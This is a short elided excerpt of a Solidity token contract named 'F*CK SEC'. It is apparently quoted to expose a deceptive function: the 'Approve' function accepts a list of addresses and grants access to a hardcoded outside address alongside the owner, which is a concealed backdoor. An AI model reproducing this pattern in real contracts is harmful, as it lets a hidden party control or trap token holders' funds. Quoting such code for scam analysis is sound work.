...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function Approve(address [] calldata _addresses_) external  {
        require(owner() == _msgSender() || address(0x141cDe793BFd9eee99D82B0dbB8CA44CF4Ec7006) == _msgSender(), "Ownable: caller is not the owner");
...
contract SEC is ERC20 {
    constructor() ERC20("F*CK SEC", "F*CKSEC") {
